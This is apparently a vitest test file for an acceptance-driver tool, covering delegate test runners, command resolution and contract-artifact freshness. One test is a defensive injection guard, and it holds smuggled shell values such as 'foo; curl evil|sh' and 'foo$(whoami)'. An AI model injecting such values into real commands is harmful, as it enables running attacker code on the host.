/**
 * T-05 (Wave 5) — three delegate runners + Contract-Source (Req3).
 *
 * Req3 AC:
 *   AC1: RUNNERS contains unitRunner/componentRunner/contractRunner before apiRunner.
 *   AC2: each delegate supports(scenario) by scenario.type.
 *   AC3: delegate calls forge_exec against the project test command, scoped to Evidence.
 *   AC4: no suite configured → INCONCLUSIVE + recipe guidance (/tinkerman init --recipe).
 *   AC5: forge_exec crash → INCONCLUSIVE.
 *   AC6: stale mixedRunner removed from RUNNERS.
 *   AC7: contractRunner supports Contract-Source (codegen artifact freshness).
 *   AC8: Contract-Source=pont but stale artifact → INCONCLUSIVE + rerun hint.
 *   AC9: delegate has a per-exec timeout (default 60s); timeout → INCONCLUSIVE.
 */
import { describe, expect, it } from "vitest";
import {
  checkContractFresh,
  type DelegateConfig,
  RUNNERS,
  resolveTestCommand,
} from "../src/accept-driver.js";

describe("RUNNERS — three delegates added, mixed removed (Req3 AC1, AC6)", () => {
  const types = RUNNERS.map((r) => r.type);

  it("contains unitRunner, componentRunner, contractRunner", () => {
    expect(types).toContain("unit");
    expect(types).toContain("component");
    expect(types).toContain("contract");
  });

  it("delegates appear before apiRunner", () => {
    const unitIdx = types.indexOf("unit");
    const apiIdx = types.indexOf("api");
    expect(unitIdx).toBeGreaterThanOrEqual(0);
    expect(apiIdx).toBeGreaterThan(unitIdx);
  });

  it("mixedRunner is removed from RUNNERS", () => {
    expect(types).not.toContain("mixed");
  });

  it("each delegate supports() its own scenario type", () => {
    for (const t of ["unit", "component", "contract"] as const) {
      const runner = RUNNERS.find((r) => r.type === t);
      expect(runner).toBeDefined();
      expect(runner!.supports({ type: t } as never)).toBe(true);
      expect(runner!.supports({ type: "api" } as never)).toBe(false);
    }
  });
});

describe("resolveTestCommand — pure command resolver (Req3 AC3)", () => {
  const cfg: DelegateConfig = {
    testCommands: {
      unit: "pnpm run test:unit",
      component: "pnpm run test:component",
      contract: "pnpm run test:contract",
    },
    packageManager: "pnpm",
  };

  it("uses explicit test_commands mapping when present", () => {
    expect(resolveTestCommand("unit", cfg)).toBe("pnpm run test:unit");
    expect(resolveTestCommand("component", cfg)).toBe("pnpm run test:component");
  });

  it("falls back to convention <pkg manager> run test:<layer> when mapping absent", () => {
    const cfgNoMap: DelegateConfig = { packageManager: "npm" };
    expect(resolveTestCommand("unit", cfgNoMap)).toBe("npm run test:unit");
  });

  it("detects pnpm from packageManager field", () => {
    expect(resolveTestCommand("unit", { packageManager: "pnpm" })).toContain("pnpm");
  });

  it("falls back to npm when no package manager detectable", () => {
    expect(resolveTestCommand("unit", {})).toContain("npm run test:unit");
  });

  it("scopes command to Evidence file via path suffix when provided", () => {
    const cmd = resolveTestCommand("unit", cfg, "test/foo.test.ts");
    expect(cmd).toContain("test/foo.test.ts");
  });

  // Audit P3-latent-B (2026-07-16): evidencePath is extracted from a
  // scenario's Evidence: line and spliced onto the test command. It must be a
  // path, never shell operators. Although the delegate runner is currently
  // dead code, refuse metacharacters now so re-wiring can't activate the
  // injection (SR-2).
  it("rejects an evidencePath containing shell operators (injection guard)", () => {
    expect(() => resolveTestCommand("unit", cfg, "foo; curl evil|sh")).toThrow(
      /meta|inject|shell|unsafe|path/i,
    );
    expect(() => resolveTestCommand("unit", cfg, "foo$(whoami)")).toThrow(
      /meta|inject|shell|unsafe|path/i,
    );
  });
});

describe("checkContractFresh — Contract-Source freshness (Req3 AC7, AC8)", () => {
  it("openapi/pont source with existing artifact → fresh", () => {
    const result = checkContractFresh({
      source: "pont",
      artifactPath: "src/contract-validator.ts", // exists in this repo
      swaggerSourcePath: null,
    });
    expect(result.fresh).toBe(true);
  });

  it("pont source with missing artifact → stale + rerun hint (AC8)", () => {
    const result = checkContractFresh({
      source: "pont",
      artifactPath: "nonexistent/generated.d.ts",
      swaggerSourcePath: null,
    });
    expect(result.fresh).toBe(false);
    expect(result.reason).toMatch(/rerun.*generate|generate.*pont/i);
  });

  it("manual source → always fresh (no auto-check)", () => {
    const result = checkContractFresh({
      source: "manual",
      artifactPath: "nonexistent.d.ts",
      swaggerSourcePath: null,
    });
    expect(result.fresh).toBe(true);
  });

  it("pact source → fresh (pact freshness is the consumer test's job)", () => {
    const result = checkContractFresh({
      source: "pact",
      artifactPath: "nonexistent.json",
      swaggerSourcePath: null,
    });
    expect(result.fresh).toBe(true);
  });
});
